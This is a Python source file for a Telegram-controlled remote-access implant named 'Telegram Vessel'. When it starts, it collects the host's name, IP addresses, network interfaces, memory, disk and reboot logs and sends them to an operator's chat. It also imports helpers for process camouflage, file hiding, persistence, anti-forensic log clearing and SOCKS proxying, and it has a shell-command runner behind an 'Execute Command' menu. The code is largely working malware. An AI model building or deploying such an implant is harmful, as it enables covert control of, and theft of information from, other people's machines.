import logging
import platform
import socket
from typing import Dict
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    PicklePersistence,
    filters,
    CallbackContext,
)
from telegram.request import HTTPXRequest
import coloredlogs
from utils.config import BOT_TOKEN, CHAT_ID, SOCKS_PROXY, ENABLE_CAMOUFLAGE, ENABLE_PERSISTENCE, ENABLE_SEEDS, ENABLE_ANTI_FORENSICS
from utils.camouflage import set_process_name, hide_file
from utils.persistence import setup_persistence, random_start_delay
from utils.execution import handle_telegram_commands, send_to_telegram
from utils.anti_forensics import clear_logs
from utils.seed_management import plant_seeds, check_seed_activation
from utils.logging import log_info, log_warning, log_error, log_debug, log_critical
import httpx

import psutil
import shutil
import subprocess
import datetime

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.DEBUG  # Adjust as needed
)
coloredlogs.install(level='DEBUG', logger=logging.getLogger())
logger = logging.getLogger(__name__)

# Reduce noise from third-party libraries
logging.getLogger("httpx").setLevel(logging.INFO)
logging.getLogger("httpcore").setLevel(logging.INFO)
logging.getLogger("telegram.ext").setLevel(logging.INFO)
logging.getLogger("apscheduler").setLevel(logging.INFO)

# Conversation states
CHOOSING, TYPING_REPLY, TYPING_CHOICE = range(3)
reply_keyboard = [
    ["System Info", "Execute Command"],
    ["Enable Camouflage", "Disable Camouflage"],
    ["Done"],
]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

# Create the Request object with SOCKS proxy and adjusted connection pool settings
try:
    request = HTTPXRequest(
        proxy=SOCKS_PROXY, 
        connection_pool_size=10,  
        pool_timeout=5.0          
    ) if SOCKS_PROXY else None
    log_info(f"Using proxy: {SOCKS_PROXY}" if SOCKS_PROXY else "No proxy configured.")
except Exception as e:
    log_critical(f"Error setting up proxy: {e}")
    request = None

# Initialize the bot Application
try:
    persistence = PicklePersistence(filepath="telegram_vessel")
    application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
    log_info("Bot initialized.")
except Exception as e:
    log_critical(f"An unexpected error occurred during bot initialization: {e}")
    raise

def gather_system_info_basic() -> Dict[str, str]:
    """Gathers basic system information."""
    system_info = {
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
    }
    return system_info





def run_command(command):
    """Run a shell command and return the output."""
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def get_boot_time():
    """Get system boot time and convert it to a human-readable format."""
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.datetime.fromtimestamp(boot_time_timestamp)
    return bt.strftime("%Y-%m-%d %H:%M:%S")

def get_uptime():
    """Calculate the system uptime since last reboot."""
    boot_time = psutil.boot_time()
    now = datetime.datetime.now().timestamp()
    uptime_seconds = now - boot_time
    uptime_string = str(datetime.timedelta(seconds=int(uptime_seconds)))
    return uptime_string

def get_last_reboot_logs():
    """Fetch the logs related to the last system reboot."""
    logs = run_command("journalctl -b -1 -n 50")
    return logs if logs else "No logs found for the last reboot."

def gather_system_info():
    """Gathers comprehensive system information."""
    
    # Basic system information
    system_info = {
        "Hostname": socket.gethostname(),
        "IP Address": run_command("hostname -I"),
        "OS": f"{platform.system()} {platform.release()}",
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
    }

    # Memory information
    mem = psutil.virtual_memory()
    system_info.update({
        "Total Memory": f"{mem.total / (1024 ** 3):.2f} GB",
        "Available Memory": f"{mem.available / (1024 ** 3):.2f} GB",
        "Used Memory": f"{mem.used / (1024 ** 3):.2f} GB",
        "Memory Usage": f"{mem.percent}%",
    })

    # Disk usage information
    disk_usage = shutil.disk_usage("/")
    system_info.update({
        "Total Disk Space": f"{disk_usage.total / (1024 ** 3):.2f} GB",
        "Used Disk Space": f"{disk_usage.used / (1024 ** 3):.2f} GB",
        "Free Disk Space": f"{disk_usage.free / (1024 ** 3):.2f} GB",
        "Disk Usage": f"{disk_usage.used / disk_usage.total * 100:.2f}%",
    })

    # Network interfaces and IPs
    net_if_addrs = psutil.net_if_addrs()
    network_info = {}
    for interface, addrs in net_if_addrs.items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                network_info[interface] = addr.address

    system_info.update({
        "Network Interfaces": network_info
    })

    # Uptime and boot information
    system_info.update({
        "Last Boot Time": get_boot_time(),
        "System Uptime": get_uptime(),
    })

    # Logs related to the last reboot
    system_info.update({
        "Last Reboot Logs": get_last_reboot_logs()
    })

    return system_info



async def send_system_info(context: CallbackContext) -> None:
    """Sends the detailed system information to the Telegram bot."""
    chat_id = context.job.chat_id  # Access chat_id directly
    info = gather_system_info()
    log_info(f"System Info: {info}")

    # Construct the message with all relevant system information
    message = (
        f"🔔 *Telegram Vessel is now running*\n\n"
        f"*Hostname:* {info['Hostname']}\n"
        f"*IP Address:* {info['IP Address']}\n"
        f"*OS:* {info['OS']}\n"
        f"*OS Version:* {info['OS Version']}\n"
        f"*Architecture:* {info['Architecture']}\n"
        f"*Processor:* {info['Processor']}\n"
        f"*Python Version:* {info['Python Version']}\n\n"
        f"*Memory Info:*\n"
        f"  - Total Memory: {info['Total Memory']}\n"
        f"  - Available Memory: {info['Available Memory']}\n"
        f"  - Used Memory: {info['Used Memory']}\n"
        f"  - Memory Usage: {info['Memory Usage']}\n\n"
        f"*Disk Info:*\n"
        f"  - Total Disk Space: {info['Total Disk Space']}\n"
        f"  - Used Disk Space: {info['Used Disk Space']}\n"
        f"  - Free Disk Space: {info['Free Disk Space']}\n"
        f"  - Disk Usage: {info['Disk Usage']}\n\n"
        f"*Network Interfaces:*\n"
    )

    # Add network interfaces and their IPs
    for iface, ip in info['Network Interfaces'].items():
        message += f"  - {iface}: {ip}\n"

    # Add uptime and boot time information
    message += (
        f"\n*System Uptime:* {info['System Uptime']}\n"
        f"*Last Boot Time:* {info['Last Boot Time']}\n\n"
        f"*Last Reboot Logs:*\n"
        f"{info['Last Reboot Logs']}"
    )

    # Send the constructed message to the Telegram bot
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    log_info("Detailed system information sent to the user.")
    send_to_telegram(message)

async def send_system_info_basic(context: CallbackContext) -> None:
    """Sends the system information to the Telegram bot."""
    chat_id = context.job.chat_id  # Access chat_id directly
    info = gather_system_info()
    log_info(f"System Info: {info}")
    message = (
        f"🔔 *Telegram Vessel is now running*\n\n"
        f"*Hostname:* {info['Hostname']}\n"
        f"*IP Address:* {info['IP Address']}\n"
        f"*OS:* {info['OS']} {info['OS Version']}\n"
        f"*Architecture:* {info['Architecture']}\n"
        f"*Processor:* {info['Processor']}\n"
        f"*Python Version:* {info['Python Version']}"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    log_info("System information sent to the user.")
    send_to_telegram(message)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and send system info."""
    user = update.effective_user
    chat_id = update.effective_chat.id  # Get the chat ID from the update

    log_info(f"Received /start command from user: {user.username} in chat {chat_id}")

    await update.message.reply_text(
        "Hi! I'm ready to assist you. What would you like to do?",
        reply_markup=markup,
    )

    # Schedule system info to be sent immediately
    context.job_queue.run_once(send_system_info, 1, chat_id=chat_id)

    return CHOOSING

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Echo the user message."""
    log_info(f"Received message: {update.message.text} from {update.effective_user.username}")
    await update.message.reply_text(update.message.text)

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """End the conversation."""
    await update.message.reply_text(
        "Goodbye! Use /start to begin again.", reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    logger.info("Starting the main function.")
    logger.info(f"Configured CHAT_ID is: {CHAT_ID}")

    # Create the Application and pass it your bot's token.
    persistence = PicklePersistence(filepath="telegram_vessel")
    application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
    
    # Send an initial message to the chat
    application.job_queue.run_once(send_system_info, 1, chat_id=CHAT_ID)

    # Add conversation handler with the states CHOOSING, TYPING_CHOICE, and TYPING_REPLY
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSING: [
                MessageHandler(filters.Regex("^(System Info|Execute Command)$"), start),
            ],
            TYPING_REPLY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, echo),
            ],
        },
        fallbacks=[CommandHandler("done", done)],
        name="my_conversation",
        persistent=True,
    )

    application.add_handler(conv_handler)

    # Run the bot until the user presses Ctrl-C
    logger.info("Starting the bot polling.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
